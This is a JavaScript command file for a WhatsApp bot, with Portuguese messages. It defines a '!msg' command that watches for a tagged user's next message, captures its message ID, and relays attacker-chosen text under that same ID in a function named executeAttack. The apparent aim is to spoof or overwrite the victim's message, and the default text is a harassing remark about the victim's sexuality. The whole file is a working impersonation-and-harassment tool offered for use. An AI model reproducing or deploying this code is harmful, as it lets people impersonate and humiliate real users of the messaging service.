// commands/msg.js
module.exports = {
  name: 'msg',
  async execute({ sock, msg, args, body }) {
    let from = msg.key.remoteJid
    let targetGroupJid = null
    let mentionedJid = null
    let messageText = ''

    const pipeParts = body.split('|').map(p => p.trim())

    if (pipeParts.length >= 2 && pipeParts[0].includes('@g.us')) {
      targetGroupJid = pipeParts[0].replace(/^!msg\s+/, '').trim()
      const targetPart = pipeParts[1].replace('@', '').trim()
      mentionedJid = targetPart.includes('@s.whatsapp.net')
        ? targetPart
        : targetPart + '@s.whatsapp.net'

      messageText = pipeParts.slice(2).join('|').trim()

      from = targetGroupJid
    } else {
      mentionedJid = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]
        || msg.message?.extendedTextMessage?.contextInfo?.participant

      if (!mentionedJid) {
        await sock.sendMessage(msg.key.remoteJid, {
          text: 'Marque alguém com @ para usar o comando.\nEx: !msg @alguem mensagem aqui'
        })
        return
      }

      const fullBody = msg.message?.conversation
        || msg.message?.extendedTextMessage?.text
        || ''

      const afterCmd = fullBody.replace(/^!msg\s+/i, '').trim()
      const mentionText = '@' + mentionedJid.split('@')[0]
      messageText = afterCmd.replace(mentionText, '').trim()
    }

    if (!messageText) {
      messageText = 'sabem que você gosta de rapazes?'
    }

    const replyTo = msg.key.remoteJid

    let ultimaMensagemId = null

    const listener = ({ messages, type }) => {
      if (type !== 'notify') return

      for (const incoming of messages) {
        if (!incoming?.key) continue

        const msgJid = incoming.key.remoteJid

        if (targetGroupJid && msgJid !== targetGroupJid) continue

        const senderJid = incoming.key.participant || incoming.key.remoteJid

        // Normaliza (remove :xx do LID se tiver)
        const normalizedSender = senderJid?.split(':')[0] + '@s.whatsapp.net'
        const normalizedTarget = mentionedJid.split(':')[0] + '@s.whatsapp.net'

        if (normalizedSender !== normalizedTarget) continue
        if (incoming.key.fromMe) continue

        ultimaMensagemId = incoming.key.id
        console.log(`[MSG] Capturado ID de ${mentionedJid}: ${ultimaMensagemId}`)

        sock.ev.off('messages.upsert', listener)
        executeAttack(sock, from, ultimaMensagemId, messageText, replyTo)
        break
      }
    }

    sock.ev.on('messages.upsert', listener)
  }
}

async function executeAttack(sock, targetJid, customId, messageText, notifyJid) {
  try {
    const messageContent = {
      extendedTextMessage: {
        text: messageText
      }
    }

    await sock.relayMessage(targetJid, messageContent, {
      messageId: customId
    })

  } catch (err) {
    console.error('[MSG] Erro no ataque:', err)
    if (notifyJid) {
      await sock.sendMessage(notifyJid, {
        text: `Erro ao executar: ${err.message}`
      })
    }
  }
}
